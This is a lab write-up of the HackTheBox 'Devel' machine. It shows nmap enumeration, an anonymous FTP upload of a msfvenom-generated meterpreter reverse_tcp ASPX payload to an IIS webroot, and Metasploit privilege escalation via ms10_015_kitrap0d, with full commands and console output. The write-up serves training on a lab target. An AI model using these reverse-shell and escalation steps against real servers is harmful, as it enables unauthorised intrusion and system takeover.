---
layout: page
title: HackTheBox Devel Writeup
---

Devel is a HackTheBox machine that involves vulnerability with default configuration of services on a server. By dropping a webshell, I was able to get initial access into the webserver as a low privileged user. By doing more enumeration, certain metasploit modules are found that can be utilized to escalate to System.

### Enumeration
Using zenmap, we get the following result:

![devel](https://user-images.githubusercontent.com/41026969/52419510-3ef66a00-2abe-11e9-9120-d5dbd65426ec.PNG)

Similarly, we can use command line nmap to view information about the machine. In this case the command I use is ```nmap -sC -sV -oA devel 10.10.10.5```. To quickly explain what's after the ```nmap```: ```-sC``` will preform the default scrips for scanning a network (note: this scan can be considered intrusive, so use on networks that you have permission on only), ```-sV``` runs a version scan, ```-oA [name]``` will store the output that you can read, in this case, we named the file devel, to read the output that nmap found we can simple do ```cat devel.nmap```. Here's the output that doing the scan does:

![devel](https://user-images.githubusercontent.com/41026969/52517060-1b890780-2c03-11e9-95c2-abcc419c7664.png)

We see that port 21 and port 80 are both open. I did some researching on what these ports do: port 21 is used for FTP which stands for file transfer protocol. ```FTP servers open their machine's port 21 and listen for incoming client connections. FTP clients connect to port 21 of remote FTP servers to initiate file transfer operations.``` Port 80 is assigned to HTTP, it's the port that the computer sends/receives from a web server; also used to send/receive HTML pages or data. 

Pulling up the webpage of the IP address (10.10.10.5), we get the default IIS webpage:

![devel](https://user-images.githubusercontent.com/41026969/52517115-03fe4e80-2c04-11e9-8e4b-c300b8c66908.png)

From the enumeration methods above, we see that ```ftp``` (port 21) is OPEN and that ```Anonymous login allowed```. This means we can get access through logging in as ```Anonymous``` and it'll accept any password. Also we find out that the server runs on Microsoft-IIS version 7.5

So playing around with the FTP server, I first make an ```.html``` file by doing ```echo WillThisGoThrough? > test.html```. Now since this server DOES allow anonymous access, we can ```ftp 10.10.10.5``` and login as user ```anonymous``` and type in any password and it'll give us a shell. I then upload the ```test.html``` file and we can see that the server does indeed receive and that we can access it. This can be our point of exploitation. Here it is shown below:

![devel](https://user-images.githubusercontent.com/41026969/52517203-a8cd5b80-2c05-11e9-9633-31973581765e.png)

So to see if the message ```WillThisGoThrough?``` went through, we can try and access it by going to the webpage ```10.10.10.5/test.html```. And we see that it has indeed went through:

![devel](https://user-images.githubusercontent.com/41026969/52517212-de724480-2c05-11e9-90a4-1fa6338529c4.png)

So since this is an IIS server, it does execute code, usually asp or aspx (basically source code/scripts that are used to generate how the webage should be opened and displayed). Since we know from enumeration that this machine is likely running on Windows 2008, it's likely that it's running aspx which is .NET base (asp is used mainly for older, early 2000s OS).

### Exploitation 
With what we know, we can start using ```msfvenom``` to create us a payload. Doing ```msfvenom -h``` will bring up the help screen that will show the syntax and options used.

So to list all the windows exploits we can do:
```
msfvenom --list payload | grep windows
```
note: this may take a minute to complete. After it is done, it will create a list of all the types of payloads that can be used. For this challenge, I want to use a metrepeter reverse tcp, as if I use an 64 bit exploit, it WILL NOT work on a 32 bit machine (we do not know if this machine is 32 or 64 bit, so using a reverse tcp shell is the safest). 

Scrolling up a bit, we see something we can use: ```windows/meterpreter/reverse_tcp```

Looking back at the help screen of msfvenom (```msfvenom -h```) I see the different options I can use to create the payload. This is how the command looks like:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local IP] LPORT=[local port] -f aspx -o develExploit.aspx 
```
Then we ftp back into the server and upload the listener:

![devel](https://user-images.githubusercontent.com/41026969/52536905-6ce1e580-2d2e-11e9-9cf8-f5c9d6a5ab41.png)

So now we can use metasploit (```msfconsole```) to start. First I do ```use exploit/multi/handler``` then set the payload to the same thing we used in msfvenom: ```msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp```. Then I set the LHOST to ```tun0```. Then I ```run```. Going back to the IP website of the machine and using the exploit we created (```http://10.10.10.5/develExploit.aspx```) it will create a metrepreter session.

Once we get a session, we can do ```sysinfo``` to get more information about the machine. Furthermore, we can use ```shell``` to get a shell (though not admin). Here's what it looks like:

![devel](https://user-images.githubusercontent.com/41026969/52537080-7f5d1e80-2d30-11e9-804f-9381c698ec58.png)
![devel](https://user-images.githubusercontent.com/41026969/52537094-a6b3eb80-2d30-11e9-8890-c3fdcd8c903b.png)

Backing out by exiting the meterpreter session (use command ```background```), we can use ```msf > post/multi/recon/local_exploit_suggester``` to bring up a list of suggested exploits based on the machine we just accessed. Here's how it'll look like:
```
meterpreter > background
[*] Backgrounding session 1...

msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 39 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf post(multi/recon/local_exploit_suggester) > 
```

For this machine I used ```exploit/windows/local/ms10_015_kitrap0d```. So here's the commands I did:
```msf exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d```

And now since the LHOST and LPORT changed to something different, I changed it back to the correct LHOST and LPORT (same ones I used for the reverse TCP listener in msfvenom):
```
msf exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
msf exploit(windows/local/ms10_015_kitrap0d) > set LHOST [IP]
LHOST => [IP]
msf exploit(windows/local/ms10_015_kitrap0d) > set LPORT [Port]
LPORT => [Port]
msf exploit(windows/local/ms10_015_kitrap0d) > run
```
Doing so, we get access to the machine!:

![devel](https://user-images.githubusercontent.com/41026969/52537602-8850ee80-2d36-11e9-9d3e-c96c19d28940.png)

Directory to root flag: ```c:\Users\Administrator\Desktop>root.txt.txt```

Directory to user flag: ```c:\Users\babis\Desktop>user.txt.txt```